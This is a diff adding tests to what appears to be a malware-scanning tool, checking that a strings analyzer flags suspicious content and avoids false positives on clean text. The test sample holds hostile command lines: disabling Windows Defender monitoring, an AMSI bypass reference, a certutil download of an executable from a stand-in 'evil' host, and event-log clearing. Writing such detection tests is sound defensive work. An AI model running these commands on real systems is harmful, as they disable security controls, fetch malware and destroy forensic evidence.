@@ -521,3 +521,28 @@ def test_stego_detects_pe_dos_stub_polyglot(tmp_path):
     ctx = _ctx(tmp_path, "x.jpg", jpeg)
     titles = [f.title for f in StegoAnalyzer().analyze(ctx)]
     assert any("PE executable" in t for t in titles)
+
+
+def test_strings_behavior_and_ioc_additions(tmp_path):
+    from hawkscan.analyzers.strings_analyzer import StringsAnalyzer
+    data = (b"powershell Set-MpPreference -DisableRealtimeMonitoring $true\n"
+            b"GetType('System.Management.Automation.AmsiUtils'); AmsiScanBuffer\n"
+            b"certutil -urlcache -split -f http://evil/x.exe\n"
+            b"wevtutil cl System\n"
+            b"send to 0x32Be343B94f860124dC4fEe278FDCBD38C102D88\n"
+            b"contact attacker@evil-mail.ru\n")
+    ctx = _ctx(tmp_path, "s.bin", data)
+    titles = [f.title for f in StringsAnalyzer().analyze(ctx)]
+    assert any("Defender tampering" in t for t in titles)
+    assert any("AMSI bypass" in t for t in titles)
+    assert any("certutil" in t for t in titles)
+    assert any("Event-log clearing" in t for t in titles)
+    assert any("Ethereum address" in t for t in titles)
+    assert any("email address" in t for t in titles)
+
+
+def test_strings_clean_text_no_behavior_fp(tmp_path):
+    from hawkscan.analyzers.strings_analyzer import StringsAnalyzer
+    ctx = _ctx(tmp_path, "r.txt", b"The quick brown fox jumps over the lazy dog. " * 20)
+    cats = {f.category for f in StringsAnalyzer().analyze(ctx)}
+    assert "evasion" not in cats and "ransomware" not in cats
